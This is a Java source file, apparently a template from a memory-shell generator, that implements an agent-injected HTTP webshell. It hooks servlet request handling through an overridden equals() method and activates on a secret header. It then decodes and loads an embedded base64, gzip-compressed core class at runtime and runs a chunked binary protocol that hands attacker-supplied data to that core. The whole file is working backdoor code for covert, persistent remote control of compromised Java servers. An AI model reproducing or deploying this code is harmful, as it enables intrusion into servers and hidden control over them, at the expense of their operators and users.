package org.leo.jmg.mem.shell.http;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.util.zip.GZIPInputStream;

/** Agent 挂载点的 HTTP Chunk 协议 Shell。 */
public class LeoAgentChunkTpl extends ClassLoader {
    private static String headerName;
    private static String headerValue;
    private static String coreClassName;
    private static String coreClass;
    private static int respCode;

    public LeoAgentChunkTpl() {
    }

    public LeoAgentChunkTpl(ClassLoader parent) {
        super(parent);
    }

    @Override
    @SuppressWarnings("all")
    public boolean equals(Object value) {
        if (!(value instanceof Object[])) return false;
        Object[] arguments = (Object[]) value;
        Object[] exchange = resolveExchange(arguments);
        if (exchange == null) return false;
        Object request = exchange[0];
        Object response = exchange[1];
        try {
            Object header = invoke(request, "getHeader", new Class[]{String.class}, new Object[]{headerName});
            if (header == null || !String.valueOf(header).contains(headerValue)) return false;

            invoke(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{Integer.valueOf(respCode)});
            optionalInvoke(response, "setHeader", new Class[]{String.class, String.class},
                    new Object[]{"X-Accel-Buffering", "no"});
            optionalInvoke(response, "setHeader", new Class[]{String.class, String.class},
                    new Object[]{"Connection", "keep-alive"});
            optionalInvoke(response, "setContentType", new Class[]{String.class},
                    new Object[]{"application/octet-stream"});
            optionalInvoke(response, "setBufferSize", new Class[]{Integer.TYPE},
                    new Object[]{Integer.valueOf(8192)});

            InputStream input = (InputStream) invoke(request, "getInputStream", new Class[0], new Object[0]);
            OutputStream output = (OutputStream) invoke(response, "getOutputStream", new Class[0], new Object[0]);
            DataInputStream dataInput = new DataInputStream(input);
            DataOutputStream dataOutput = new DataOutputStream(output);
            Class core = loadCore();
            dataOutput.flush();
            while (true) {
                int frameType = dataInput.readUnsignedByte();
                long transportId = dataInput.readLong();
                int length = dataInput.readInt();
                if (length < 0 || length > 16777216) break;
                byte[] data = new byte[length];
                dataInput.readFully(data);
                if (frameType == 4) break;
                if (frameType == 3) continue;
                int responseType;
                byte[] responseData;
                if (frameType == 2 && length == 0) {
                    responseType = 3;
                    responseData = new byte[0];
                } else if (frameType == 1) {
                    responseType = 1;
                    ByteArrayOutputStream buffer = new ByteArrayOutputStream();
                    buffer.write(data);
                    try {
                        ((java.lang.reflect.InvocationHandler) core.newInstance()).invoke(null, null, new Object[]{buffer});
                    } catch (Throwable e) {
                        throw new IllegalStateException("Core invocation failed", e);
                    }
                    responseData = buffer.toByteArray();
                } else {
                    break;
                }
                if (responseData.length > 16777216) break;
                dataOutput.writeByte(responseType);
                dataOutput.writeLong(transportId);
                dataOutput.writeInt(responseData.length);
                dataOutput.write(responseData);
                dataOutput.flush();
            }
            return true;
        } catch (Throwable ignored) {
            return false;
        }
    }

    private static Object[] resolveExchange(Object[] arguments) {
        Object request = null;
        Object response = null;
        for (int i = 0; i < arguments.length; i++) {
            Object candidate = arguments[i];
            if (candidate == null) continue;
            try {
                Object nestedRequest = invoke(candidate, "getServletRequest", new Class[0], new Object[0]);
                Object nestedResponse = invoke(candidate, "getServletResponse", new Class[0], new Object[0]);
                if (nestedRequest != null && nestedResponse != null) {
                    request = nestedRequest;
                    response = nestedResponse;
                    break;
                }
            } catch (Throwable ignored) {
            }
            if (request == null && hasMethod(candidate, "getHeader", new Class[]{String.class})) {
                request = candidate;
            }
            if (response == null && hasMethod(candidate, "getOutputStream", new Class[0])) {
                response = candidate;
            }
        }
        return request == null || response == null ? null : new Object[]{request, response};
    }

    private static boolean hasMethod(Object target, String name, Class[] parameterTypes) {
        try {
            target.getClass().getMethod(name, parameterTypes);
            return true;
        } catch (Throwable ignored) {
            return false;
        }
    }

    @SuppressWarnings("all")
    private Class loadCore() throws Exception {
        ClassLoader loader = getClass().getClassLoader();
        try {
            return Class.forName(coreClassName, true, loader);
        } catch (ClassNotFoundException ignored) {
            ByteArrayOutputStream output = new ByteArrayOutputStream();
            GZIPInputStream gzip = new GZIPInputStream(
                    new ByteArrayInputStream(base64Decode(coreClass)));
            byte[] block = new byte[4096];
            int read;
            while ((read = gzip.read(block)) != -1) output.write(block, 0, read);
            gzip.close();
            byte[] bytes = output.toByteArray();
            return new LeoAgentChunkTpl(loader).defineClass(null, bytes, 0, bytes.length);
        }
    }

    private static Object invoke(Object target, String name,
                                 Class[] parameterTypes, Object[] arguments) throws Exception {
        Method method = target.getClass().getMethod(name, parameterTypes);
        method.setAccessible(true);
        return method.invoke(target, arguments);
    }

    private static void optionalInvoke(Object target, String name,
                                       Class[] parameterTypes, Object[] arguments) {
        try {
            invoke(target, name, parameterTypes, arguments);
        } catch (Throwable ignored) {
        }
    }

    @SuppressWarnings("all")
    private static byte[] base64Decode(String value) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, value);
        } catch (Exception ignored) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, value);
        }
    }
}
